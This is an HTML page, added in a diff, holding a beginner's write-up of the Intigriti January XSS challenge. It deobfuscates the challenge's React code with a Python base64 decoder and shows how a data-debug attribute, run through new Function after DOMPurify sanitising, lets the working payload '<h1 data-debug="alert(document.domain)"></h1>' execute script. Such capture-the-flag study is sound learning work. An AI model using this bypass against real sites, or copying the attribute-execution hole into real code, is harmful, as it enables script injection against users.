@@ -1,0 +1,480 @@
+<head>
+	<!-- Compiled and minified CSS -->
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">
+	<!-- Compiled and minified JavaScript -->
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
+	<!-- icons n shit -->
+	<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+	<script src="prism.js"></script>
+	<link href="prism.css" rel="stylesheet">
+</head>
+
+
+<body>
+	<div class="row">
+		<div class="container center">
+			<h2><b>&lt;h2&gt;</b>Intigriti January XSS Challange<b>&lt;/h2&gt;</b></h2>
+		</div>
+	</div>
+
+	<div class="row">
+
+	<div class="container">
+
+	<p style="font-size: 20px;">
+	&emsp;Hello, this is a writeup for January's intigriti challenge. I'm relatively new to all this hacking thing but I've heard that writing stuff down 
+	and trying to explain something is good for learning so I'm doing this as much for myself as anyone else. I hope you enjoy reading this.
+	Btw in no way I think that this is the most efficient way to solve this challenge, however I think that 
+	the journey is more important that the destination :). 
+	<br>
+	&emsp;There are 2 hints available for the challenge so first lets look at them.
+	</p><div class="center"><img src="images/pages/1/hint1.png"></div>
+
+	<p style="font-size: 20px;">
+	&#187; <b>That sanitize function looks pretty sus!</b><br>
+
+	&emsp;Hmm, since its a web app, we probably have to look at the javascript source code and find a function that sanitize user input. Lets open developer tools and look through
+	js code, maybe there's a sanitize function somewhere. However there are many, many js file in here and to be honest all those curly brackets and semicolons makes me dizzy so let's try to think of 
+	a way to limit our scope so we have to look at as little javascript as possible. Plus some of the code looks like gibberish.
+	This is where second hint comes in.
+
+	</p>
+	<div class="center"><img src="images/pages/1/hint2.png"></div>
+	<p style="font-size: 20px;">
+
+	&#187; <b>Wait, you're saying I can get the source code via a source map? But the source code is still obfuscated?</b><br>
+
+	&emsp;Lets break this hint into two parts: <b>source map</b> and <b>code obfuscation</b>.<br>
+	&emsp;&emsp;&#149; <b>Source maps</b><br>
+	&emsp;&emsp;Source maps generate user readable javascript code from minified source files, for example if you write code in TypeScript or 
+	CoffeeScript. Also React code is minified in the same way. Minified file is a file where javascript is written in one or few lines and variable names usually are single letters. Modern browsers find map files automatically and generates user readable javascript.
+	In developer tools if you open right click in a js file and click "jump to original location" you can see the minified javascript file . Map file 
+	is a seperate file that's linked as a comment in the original file, for example: <code class="lang-js">//# sourceMappingURL=main.02a05519.js.map</code>
+
+	<br>
+	&emsp;&emsp;&#149; <b>Code obfuscation</b><br>
+	&emsp;&emsp;Code obfuscation is a method of converting code so it's no longer readable by a human. Parts of code can be encoded and replaced by 
+	variables or encoded strings to make it harder to understand code.
+
+	<br>
+	<br>
+
+	&emsp;This is great n all, however there still is tons of javascript we have to go through, so let's try to find a place to start.
+	Since we still haven't tested the challenge website let's start by doing that.
+	After adding a payload, we can see that the URL changes to a /result page. Lets try to figure out what happens when we visit /result page:
+
+	</p>
+	<div class="center"><img src="images/pages/1/test1.png"></div>
+	<br>
+	<br>
+	<p style="font-size: 20px;">
+	&emsp;To do this I looked through js files for all references to "result" string. You can to this 
+	by pressing ctrl+f in a js file in developer console. Most of the files that contained "result" string had nothing interesting in
+	them, "result" was part of a comment or it was a function, but what we are looking for something that could route "result" page.
+	After going through few files I found router.js file that had <code class="lang-js">path="result"</code>in it.
+
+	</p>
+	<div class="center"><img src="images/pages/1/router.png"></div>
+	<br>
+	<br>
+	<p style="font-size: 20px;">
+
+	&emsp;Turns out React uses something called <a href="https://www.reactjstutorials.com/react-basics/22/browserrouter-switch-and-routes">BrowserRouter</a>
+	to route web pages. Instead of looking for "result" we could have looked for "BrowserRouter". In BrowserRouter we can see that <code class="lang-js">I0x1</code> function is called
+	and <code class="lang-js">identifiers</code> variable is passed to it. Before we check what this <code class="lang-js">I0x1</code>function does, lets look at <code class="lang-js">identifiers</code> variable. It's a dictionary that 
+	contains some gibberish strings. None of the values in the dictionary make any sense. Before we learned what is code obfuscation, maybe this is 
+	an example of obfuscated code? If we looked at the values in dictionary, some of them contain = at the end of strings. One of the most popular encoding
+	schemes - <a href="https://en.wikipedia.org/wiki/Base64">base64</a>, encodes the string in a way where the encoded string must be dividable by 4. 
+	If it's not, a padding character(=) is used. Let's try to decode a values and check if it's indeed base64 encoded. Our first value <a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)&input=VW1WemRXeDA">UmVzdWx0</a>
+	base64 decoded is "Result". From this we can conclude that <code class="lang-js">identifiers</code> variable indeed is used to obfuscate some code (probably <code class="lang-js">I0x1</code> function that it's passed to).<br>
+	&emsp;Now that we know what <code class="lang-js">identifiers</code> dictionary is used for let's look at the <code class="lang-js">I0x1</code> function. First of all, how do we find this function. At the top of router.js file we 
+	can see that <code class="lang-js">I0x1</code> is imported from "./pages/IOx1" in <code class="lang-js">import I0x1 from "./pages/I0x1"</code> line.  "." Represents our current location so in the same folder as router.js there should be a pages folder inside which there should 
+	be I0x1 folder. Lets open index.js that's inside of this folder.
+
+
+	</p>
+	<div class="center"><img src="images/pages/1/I0x1.png"></div>
+	<br>
+	<br>
+	<p style="font-size: 20px;">
+
+
+	&emsp;Great, we're greeted by some more gibberish javascript code, but there is one variable that we have seen before - identifiers dictionary + 
+	every time there's a value from this dictionary a <code class="lang-js">window.atob</code> method is called. What this method does is it decodes the base64 string. To better understand
+	the code we should do each of the decoding operations and look at the result code. To do this we could decode each string in dictionary, then 
+	find and replace it (ctrl+h usually in text editors) in index.js file or we can write a python script that does it for us.
+	</p>
+	<pre>
+	<code class="lang-python">
+import base64
+
+#identifiers dictionary
+ident = {'I0x1': "UmVzdWx0", 'I0x2': "cGF5bG9hZEZyb21Vcmw=", 'I0x3': "cXVlcnlSZXN1bHQ=", 'I0x4': "bG9jYXRpb24=",
+	'I0x5': "c2VhcmNo", 'I0x6': "Z2V0", 'I0x7': "cGF5bG9hZA==", 'I0x8': "cmVzdWx0", 'I0x9': "X19odG1s", 
+	'I0xA': "PGgxIHN0eWxlPSJjb2xvcjogIzAwYmZhNSI+Tm90aGluZyBoZXJlITwvaDE+", 'I0xB': "aGFuZGxlQXR0cmlidXRlcw==", 
+	'I0xC': "ZWxlbWVudA==", 'I0xD': "Y2hpbGQ=", 'I0xE': "Y2hpbGRyZW4=", 'I0xF': "YXR0cmlidXRlcw==", 
+	'I0x10': "Z2V0QXR0cmlidXRl", 'I0x11': "ZGF0YS1kZWJ1Zw==", 'I0x12': "c2FuaXRpemVIVE1M", 'I0x13': "aHRtbE9iag==", 
+	'I0x14': "dGVtcGxhdGU=", 'I0x15': "c2FuaXRpemU=", 'I0x16': "Y3JlYXRlRWxlbWVudA==", 'I0x17': "aW5uZXJIVE1M", 
+	'I0x18': "YXBwZW5kQ2hpbGQ=", 'I0x19': "Z2V0RWxlbWVudHNCeVRhZ05hbWU=", 'I0x1A': "Y29udGVudA==", 
+	'I0x1B': "cmVtb3ZlQ2hpbGQ=", 'I0x1C': "SG9tZQ==", 'I0x1D': "c2V0UGF5bG9hZA==", 'I0x1E': "ZWRpdG9yUmVm", 
+	'I0x1F': "bmF2aWdhdGU=", 'I0x20': "aGFuZGxlU3VibWl0", 'I0x21': "ZXZlbnQ=", 'I0x22': "cHJldmVudERlZmF1bHQ=", 
+	'I0x23': "L3Jlc3VsdD9wYXlsb2FkPQ==", 'I0x24': "dmFsdWU=", 'I0x25': "a2V5", 'I0x26': "VGFi", 'I0x27': "c2hpZnRLZXk=", 
+	'I0x28': "c2V0UmFuZ2VUZXh0", 'I0x29': "ICAgIA==", 'I0x2A': "c2VsZWN0aW9uU3RhcnQ=", 'I0x2B': "ZW5k", 'I0x2C': "bGluZVN0YXJ0", 
+	'I0x2D': "c3RhcnQ=", 'I0x2E': "bGVuZ3Ro", 'I0x2F': "c2xpY2U=", 'I0x30': "c2V0U2VsZWN0aW9uUmFuZ2U=", 'I0x31': "Cg==", 'I0x32': 
+	"Ym9keQ==", 'I0x33': "dGFyZ2V0", 'I0x34': "Y3VycmVudA=="}
+
+replc_file = open('index.js', 'r').read()
+
+for x in ident: # for each key,value pair in dictionary, find and replace base64 value to deocded value
+    key =  x
+    value = ident[x]
+    dec_value = "'" + base64.b64decode(value).decode('utf-8') + "'"
+    rep_value = f'window.atob(identifiers["{key}"])'
+    replc_file = replc_file.replace(rep_value, dec_value)
+
+with open('decoded_index.js', 'w') as f:
+    f.write(replc_file)
+
+print(replc_file)
+
+	</code>
+
+	</pre>
+
+	<p style="font-size: 20px;">
+	&emsp;Now we are left we a bit prettier javascript code that's starting to make some sense.
+	</p>
+	<pre>
+
+	<code class="lang-js">
+import { useState } from "react";
+import DOMPurify from "dompurify";
+import "../../App.css";
+
+function I0x1({ identifiers }) {
+	const [I0x2, _] = useState(() => {
+		const I0x3 = new URLSearchParams(window["location"]["search"])["get"]("payload");
+
+		if (I0x3) {
+			const I0x8 = {};
+			I0x8["__html"] = I0x3;
+			return I0x8;
+		}
+
+		const I0x8 = {};
+		I0x8["__html"] = '&lt;h1 style="color: #00bfa5">Nothing here!&lt;/h1>';
+		return I0x8;
+	});
+
+	function I0xB(I0xC) {
+		for (const I0xD of I0xC["children"]) {
+			if ("data-debug" in I0xD["attributes"]) {
+				new Function(I0xD["getAttribute"]("data-debug"))();
+			}
+			I0xB(I0xD);
+		}
+	}
+
+	function I0x12(I0x13) {
+		I0x13["__html"] = DOMPurify["sanitize"](I0x13["__html"]);
+
+		let I0x14 = document["createElement"]("template");
+		I0x14["innerHTML"] = I0x13["__html"];
+		document["body"]["appendChild"](I0x14);
+
+		I0x14 = document["getElementsByTagName"]("template")[0];
+		I0xB(I0x14["content"]);
+
+		document["body"]["removeChild"](I0x14);
+
+		return I0x13;
+	}
+
+	return (
+		&lt;div className="App">
+			&lt;h1>Here is the result!&lt;/h1>
+			&lt;div id="viewer-container" dangerouslySetInnerHTML={I0x12(I0x2)}>&lt;/div>
+		&lt;/div>
+	);
+}
+
+export default I0x1;
+
+
+	</code>
+	</pre>
+
+
+	<p style="font-size: 20px;">
+	&emsp;Function names and variables passed to functions are still obfuscated, but we can see what each function is doing, so let's dive in
+	and try to understand what's happening in this code. Where to start ? I think it's a good idea to start at what this function is returning and go from there. There are other function defined Inside the <code class="lang-js">I0x1</code> function, but for
+	now lets ignore that, since we're not even sure what they are used for or if they are used at all. Let's look what <code class="lang-js">I0x1</code> function is returning.
+	<pre>
+	<code class="lang-js">
+return (
+	&lt;div className="App">
+		&lt;h1>Here is the result!&lt;/h1>
+		&lt;div id="viewer-container" dangerouslySetInnerHTML={I0x12(I0x2)}>&lt;/div>
+	&lt;/div&gt;);
+	</code>
+	</pre>
+	<p style="font-size: 20px;">
+	&emsp;<a href="https://linguinecode.com/post/complete-guide-react-dangerouslysetinnerhtml">dangerouslySetInnerHTML</a> value is set by calling <code class="lang-js">I0x12</code> function with  <code class="lang-js">I0x2</code> as parameter.
+	Let's look how we get <code class="lang-js">I0x2</code> value. I added comments to this code to explain what each part is doing.
+
+	<pre>
+	<code class="lang-js">
+	const [I0x2, _] = useState(() => {
+		// gets user passed payload from payload value
+		const I0x3 = new URLSearchParams(window["location"]["search"])["get"]("payload");
+
+		if (I0x3) { // if payload is set return payload
+			const I0x8 = {};
+			I0x8["__html"] = I0x3;
+			return I0x8;
+		}
+		// if there is no payload return this
+		const I0x8 = {};
+		I0x8["__html"] =
+			'&lt;h1 style="color: #00bfa5">Nothing here!&lt;/h1>';
+		return I0x8;
+	});
+	</code>
+	</pre>
+	<p style="font-size: 20px;">
+	&emsp;So <code class="lang-js">I0x2</code> variable value is the payload value from <code class="lang-html">https://challenge-0122-challenge.intigriti.io/result?payload=1337</code>. In this case it would be 1337.
+	If no payload is set then <code class="lang-html"> &lt;h1 style="color: #00bfa5">Nothing here!&lt;/h1>'; </code> would be returned.<br>
+	&emsp;Now we know what <code class="lang-js">I0x3</code> and <code class="lang-js">I0x8</code> variables are, so let's rename them. I'm doing this by adding
+	2 lines of code to the python decoder script. Also lets rename <code class="lang-js">I0x2</code> variable to payload
+	<pre>
+	<code class="lang-python">
+replc_file = replc_file.replace("I0x3", "url_payload")
+replc_file = replc_file.replace("I0x8", "payload_object")
+replc_file = replc_file.replace("I0x2", "payload")
+	</code>
+	</pre>
+
+	<p style="font-size: 20px;">
+	&emsp;Now back to the <code class="lang-js">I0x12</code> function that we now know takes in payload variable.
+	<pre>
+	<code class="lang-js">
+	function I0x12(I0x13) {
+		// sanitizes payload (remove script tags, onerror, etc. anything that could execute js)
+		I0x13["__html"] = DOMPurify["sanitize"](I0x13["__html"]);
+
+		// creates template element and sets it to sanitized payload
+		let I0x14 = document["createElement"]("template");
+		I0x14["innerHTML"] = I0x13["__html"];
+		document["body"]["appendChild"](I0x14);
+
+		// passes template element to I0xB function
+		I0x14 = document["getElementsByTagName"]("template")[0];
+		I0xB(I0x14["content"]);
+
+		// removes template element
+		document["body"]["removeChild"](I0x14);
+
+		return I0x13;
+	}
+	</code>
+	</pre>
+
+	<p style="font-size: 20px;">
+	&emsp;Let's again change names for our newly found variables. We already know that input for this function is payload so <code class="lang-js">I0x13</code>
+	we can rename to <code class="lang-js">payload</code>. Next we create "template" element and store it <code class="lang-js">I0x14</code>. Lets rename it
+	to <code class="lang-js">template</code>. Now lets think about what this function does. It sanitizes <code class="lang-js">payload</code>, stores it into
+	<code class="lang-js">template</code>, passes template into <code class="lang-js">I0xB</code> function that we so far don't know what does and then 
+	deletes <code class="lang-js">template</code> element. It then returns <code class="lang-js">payload</code>, but don't forget that this payload is already
+	sanitized. So let's name this function <code class="lang-js">SanitizePayload</code>
+
+	<pre>
+	<code class="lang-python">
+replc_file = replc_file.replace("I0x13", "payload")
+replc_file = replc_file.replace("I0x14", "template")
+replc_file = replc_file.replace("I0x12", "SanitizePayload")
+	</code>
+	</pre>
+
+
+	<p style="font-size: 20px;">
+	&emsp;Now the last part. What is this mysterious <code class="lang-js">I0xB</code> function. Lets take a look at it.<br>
+
+	<pre>
+	<code class="lang-js">
+	function I0xB(I0xC) {
+		for (const I0xD of I0xC["children"]) { // loops through template children elements
+			if ("data-debug" in I0xD["attributes"]) { // if element has data-debug atribute
+				new Function(I0xD["getAttribute"]("data-debug"))(); // creates a new function from the value of "data-debug"
+			}
+			I0xB(I0xD);
+		}
+	}
+	</code>
+	</pre>
+
+	<p style="font-size: 20px;">
+	We know that <code class="lang-js">I0xC</code> is <code class="lang-js">template</code> variable. We are looping through 
+	every children element of template. This means that if we would supply a payload that is <code class="lang-html">&lt;h1>test&lt;/h1></code>
+	we would one time iterate through the for loop since its 1 children element. If our payload  would be <code class="lang-html">&lt;h1>test&lt;/h1> &lt;h1>test2&lt;/h1></code>
+	then for loop would have 2 iterations. <br>
+	&emsp;In this for loop we have an if statement that checks if children element contains <code class="lang-html">data-debug</code> attribute.
+	If the child element contains <code class="lang-html">data-debug</code> attribute a new function is created from the contents of this attribute and
+	code inside <code class="lang-html">data-debug</code> is executed.<br>
+	&emsp;BINGO, this is what we are looking for, we can create an payload in and element that is not sanitized and should not be able
+	to execute any javascript like <code class="lang-html">&lt;h1>&lt;/h1></code> . We can then add <code class="lang-html">data-debug</code>
+	attribute to it that also wont be sanitized since it's not considered dangerous. What the sanitizer function doesn't know is that in this scenario it can be dangerous
+	since contents of this attribute is executed as javascript code. As the name <code class="lang-html">data-debug</code> suggest this function should probably used
+	for debugging and it should not be known to end user, but since we have the power to understand some javasciript, we were able to find this function 
+	and exploit it.<br>
+
+	
+
+	&emsp; Lets replace our last few unknown variables. Run our python decoder and we should get much, much better looking javascript file.<br>
+
+	<pre>
+	<code class="lang-python">
+# Final decoder.py file
+import base64
+
+ident = {'I0x1': "UmVzdWx0", 'I0x2': "cGF5bG9hZEZyb21Vcmw=", 'I0x3': "cXVlcnlSZXN1bHQ=", 'I0x4': "bG9jYXRpb24=",
+	'I0x5': "c2VhcmNo", 'I0x6': "Z2V0", 'I0x7': "cGF5bG9hZA==", 'I0x8': "cmVzdWx0", 'I0x9': "X19odG1s", 
+	'I0xA': "PGgxIHN0eWxlPSJjb2xvcjogIzAwYmZhNSI+Tm90aGluZyBoZXJlITwvaDE+", 'I0xB': "aGFuZGxlQXR0cmlidXRlcw==", 
+	'I0xC': "ZWxlbWVudA==", 'I0xD': "Y2hpbGQ=", 'I0xE': "Y2hpbGRyZW4=", 'I0xF': "YXR0cmlidXRlcw==", 
+	'I0x10': "Z2V0QXR0cmlidXRl", 'I0x11': "ZGF0YS1kZWJ1Zw==", 'I0x12': "c2FuaXRpemVIVE1M", 'I0x13': "aHRtbE9iag==", 
+	'I0x14': "dGVtcGxhdGU=", 'I0x15': "c2FuaXRpemU=", 'I0x16': "Y3JlYXRlRWxlbWVudA==", 'I0x17': "aW5uZXJIVE1M", 
+	'I0x18': "YXBwZW5kQ2hpbGQ=", 'I0x19': "Z2V0RWxlbWVudHNCeVRhZ05hbWU=", 'I0x1A': "Y29udGVudA==", 
+	'I0x1B': "cmVtb3ZlQ2hpbGQ=", 'I0x1C': "SG9tZQ==", 'I0x1D': "c2V0UGF5bG9hZA==", 'I0x1E': "ZWRpdG9yUmVm", 
+	'I0x1F': "bmF2aWdhdGU=", 'I0x20': "aGFuZGxlU3VibWl0", 'I0x21': "ZXZlbnQ=", 'I0x22': "cHJldmVudERlZmF1bHQ=", 
+	'I0x23': "L3Jlc3VsdD9wYXlsb2FkPQ==", 'I0x24': "dmFsdWU=", 'I0x25': "a2V5", 'I0x26': "VGFi", 'I0x27': "c2hpZnRLZXk=", 
+	'I0x28': "c2V0UmFuZ2VUZXh0", 'I0x29': "ICAgIA==", 'I0x2A': "c2VsZWN0aW9uU3RhcnQ=", 'I0x2B': "ZW5k", 'I0x2C': "bGluZVN0YXJ0", 
+	'I0x2D': "c3RhcnQ=", 'I0x2E': "bGVuZ3Ro", 'I0x2F': "c2xpY2U=", 'I0x30': "c2V0U2VsZWN0aW9uUmFuZ2U=", 'I0x31': "Cg==", 'I0x32': 
+	"Ym9keQ==", 'I0x33': "dGFyZ2V0", 'I0x34': "Y3VycmVudA=="}
+replc_file = open('index.js', 'r').read()
+
+
+
+for x in ident:
+    key =  x
+    value = ident[x]
+    dec_value = "'" + base64.b64decode(value).decode('utf-8') + "'"
+    rep_value = f'window.atob(identifiers["{key}"])'
+    replc_file = replc_file.replace(rep_value, dec_value)
+
+replc_file = replc_file.replace("I0x3", "url_payload")
+replc_file = replc_file.replace("I0x2", "payload")
+replc_file = replc_file.replace("I0x8", "payload_object")
+replc_file = replc_file.replace("I0x13", "payload")
+replc_file = replc_file.replace("I0x12", "SanitizePayload")
+replc_file = replc_file.replace("I0x14", "template")
+replc_file = replc_file.replace("I0xC", "template")
+replc_file = replc_file.replace("I0xB", "DebugFunction")
+replc_file = replc_file.replace("I0xD", "element")
+
+
+with open('decoded_index.js', 'w') as f:
+    f.write(replc_file)
+
+print(replc_file)
+
+	</code>
+	</pre>
+
+
+
+
+	<pre>
+	<code class="lang-js">
+// Final decoded index.js file
+import { useState } from "react";
+import DOMPurify from "dompurify";
+import "../../App.css";
+
+function I0x1({ identifiers }) {
+  const [payload, _] = useState(() => {const url_payload = new URLSearchParams(window['location']['search'])['get']('payload');
+
+    if (url_payload) {
+      const payload_object = {};
+      payload_object['__html'] = url_payload;
+
+      return payload_object;
+    }
+
+    const payload_object = {};
+    payload_object['__html'] = '&lt;h1 style="color: #00bfa5">Nothing here!&lt;/h1>';
+
+    return payload_object;
+  });
+
+  function DebugFunction(template) {
+    for (const element of template['children']) {
+      if (
+        'data-debug' in element['attributes']) {
+        	new Function(element['getAttribute']('data-debug'))();
+      }
+
+      DebugFunction(element);
+    }
+  }
+
+
+
+  function SanitizePayload(payload) {
+    payload['__html'] = DOMPurify['sanitize'](payload['__html']);
+
+    let template = document['createElement']('template');
+    template['innerHTML'] = payload['__html'];
+    document['body']['appendChild'](template);
+
+    template = document['getElementsByTagName']('template')[0];
+    DebugFunction(template['content']);
+
+    document['body']['removeChild'](template);
+
+    return payload;
+  }
+
+  return (
+    &lt;div className="App">
+      &lt;h1>Here is the result!&lt;/h1>
+      &lt;div id="viewer-container" dangerouslySetInnerHTML={SanitizePayload(payload)}>&lt;/div>
+    &lt;/div>
+  );
+}
+
+export default I0x1;
+
+
+
+
+	</code>
+	</pre>
+
+
+
+	<p style="font-size: 20px;">
+	&emsp; Now finally lets try a payload with data-debug that we found earlier <code class="lang-html">&lt;h1 data-debug="alert(document.domain)">&lt;/h1></code>
+
+
+
+	<div class="center"><img src="images/pages/1/final.png"></div>
+
+
+	<p style="font-size: 20px;">
+	&emsp; Thank you for taking your time and reading this :) and stay safe.
+	<br>
+	<br>
+	<br>
+	<br>
+		</p>
+					<a href="index.html" class="black-text"> 
+						<span class="valign-wrapper left">
+						   <i class="material-icons">chevron_left</i>
+Go Home
+						</span>
+					</a>
+
+		</div>
+    	</div>
+	</div>
+</body>
+            
